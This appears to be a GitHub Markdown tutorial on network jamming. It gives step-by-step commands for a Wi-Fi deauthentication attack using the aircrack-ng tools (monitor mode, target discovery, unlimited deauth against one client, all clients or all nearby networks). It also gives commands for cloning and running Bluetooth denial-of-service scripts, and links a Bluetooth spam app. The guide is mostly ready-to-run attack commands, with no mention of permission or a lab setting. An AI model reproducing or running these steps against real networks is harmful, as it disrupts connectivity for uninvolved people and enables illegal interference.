<h1 align="center">Network Jamming / Network Spoofing</h1>

## Deauth. attack  

The **Deauth** attack perform on Wi-Fi (802.11) network only. It won't affect those people who are using internet via Ethernet cable (IEEE 802.3) i.e. wired cable. The target of this attach have 3 types :  
- [x] Attack on **a particular client** of a particular Wi-Fi's network (specific client if have/know his mac addreess)
- [x] Attack on **all clients** of a particular Wi-Fi's network (if don't know any client's MAC address)
- [x] Attack on **all Wi-Fi** available networks/routers directly.

> But to attack on Ethernet cable using clients, the methods are : ARP Spoofing / ARP Poisoning (Man-in-the-Middle Attack), DHCP Starvation or Rogue DHCP Attack, Switch MAC Flooding (CAM Table Overflow). But these we won't learn here, or maybe we'll learn it later. 

`~$` is local user.  
`~#` is root user.  

> Here :  
> for `-c` we mention channel no. of Wi-Fi network  
> for `-bssid` we mention the BSSID of Wi-Fi network  
> for `__STATION__` we mention the station/MAC-address of the Client  
<br>

#### Step 1 : Setup for Attack
First we need to convert the 'wlan0' interface to 'wlan0mon' interface, basically we are do setup & enabling the Wi-Fi's monitoring mode to do attack. For this we use the following commands :  
```
sudo su
iwconfig
ifconfig wlan0
airmon-ng
iwconfig wlan0
// airmon-ng start wlan0
airmon-ng check kill (2 times) . . .
airmon-ng stop wlan0 . . .
iw wlan0 del
airmon-ng start wlan0mon
iwconfig
rfkill list


clear
exit
exit
```
Run the above commands one-by-one only.  
<br>


#### Step 2 : Searching your targeted Wi-Fi network/router
Now run the following commands :  
```
sudo su

airodump-ng wlan0mon

- - -ctrl + C to stop
- - -Can close if done work
```
So, when it dispaly the required network then we can stop the process with 'ctrl + C' shortcut. But don't close this tab, it helps to copy network's channel no. & BSSID.  
<br>


#### Step 3 : Locking targeted Wi-Fi/router and Searching your targeted client
Now open new terminal tab and run the following commands :  
```
sudo su


airodump-ng wlan0mon --bssid "_" -c "_"
	(OR)
airodump-ng --bssid "_" -c "_" wlan0mon
	(OR)
airodump-ng -c_ -d "__BSS-ID__" wlan0mon


- - - - -Keep running, don't close
```
**Don't close it, keep running**. So, here we need to mentioned a particular Wi-Fi network's BSSID & channel no. And from this we are setting to attack on a particular Wi-Fi network. If want to attack all network then don't mention BSSID & channel no.
<br>
<br>


#### Step 4 : Attacking (on particular Client // on all Clients)
Now open new terminal tab and run the following commands :  
```
sudo su


aireplay-ng --deauth 0 -a "___BSS-ID___" -c "__STATION__" wlan0mon
	(OR)
besside-ng -c "_" wlan0mon


- - - - -ctrl + C ----üòÅ
```
Here, if we want to attack all then don't mention BSSID & station of any client. Also, here `--deauth 0` means unlimited attack and we can even change it to `10` or `100` also.  
<br> 


#### Step 5 : Stop/closig the setup (NOT REQUIRED)
If we have captured files in the '/Desktop' location from step-3, and after handshake happned from step-4, then we can close the step with the following command :  
```
airmon-ng stop wlan0mon
```
But this is not required as of now for us.

## Bluetooth DOS attack

***Internet is mandatory here.  

#### Step 1 : Setup Bluetooth Enable (optional)
Check whether the Bluetooth is enabled or not. If not enabled then enable it and proceed to **next step**. But if the Bluetooth icon is not appearing, or it's not enabling, then follow the below commands :   
```
rfkill list all
	- - - sudo apt-get update (not required)
sudo apt reinstall blueman
sudo apt reinstall bluetooth
/etc/init.d/bluetooth status
sudo /etc/init.d/bluetooth start

clear

sudo systemctl list-unit-files --type=service
	to exit---> ctrl + C

sudo systemctl enable blueman-mechanism.service
sudo systemctl enable bluetooth.service
sudo systemctl list-unit-files --type=service

clear
exit
```
So, now the Bluetooth must be activated properly or can also refer to this [YouTube](https://youtu.be/w1MvrcBSNjw) video. And now we can go to next step.  
<br>


#### Step 2 (METHOD - 1) : Software Cloning from GitHub repo
Follow the below commands to get the copy of 'DOS attack' software : ([reference](https://github.com/crypt0b0y/BLUETOOTH-DOS-ATTACK-SCRIPT) github link)
```
sudo apt update
sudo apt install python3
sudo git clone https://github.com/jieggiI/BLUETOOTH-DOS-ATTACK-SCRIPT.git
cd BLUETOOTH-DOS-ATTACK-SCRIPT/
python3 Bluetooth-DOS-Attack.py
```
Here, the `git clone` command may ask for your 'username' & 'password' of GitHub account.  
<br>
<br>


#### Step 2 (METHOD - 2) : Scanning & Attack device
Scan & Attack on device with the following mini-steps : 
- List all the connected / identified USB devices : `lsusb`
- List connected BT devices with thier status : `hciconfig`
- Turn on BT device : `hciconfig hci0 up`
- List connected BT devices with thier status : `hciconfig`
- Scan surrounding BT devices : `hcitool scan`
- Clone BT DoS attacke python script : `git clone https://github.com/xanonDev/BLUETOOTH-DOS-ATTACK-SCRIPT`
- List current directory content : `ls`
- Go into the repository directory : `cd BLUETOOTH-DOS-ATTACK-SCRIPT`
- List current directory content : `ls`
- Execute the DoS attack script : `python3 Bluetooth-DOS-Attack.py`
<br>

## Bluetooth Mocking/Spam app
There is also an android bluetooth spammig app, we can get this app from [GitHub](https://github.com/simondankelmann/Bluetooth-LE-Spam).
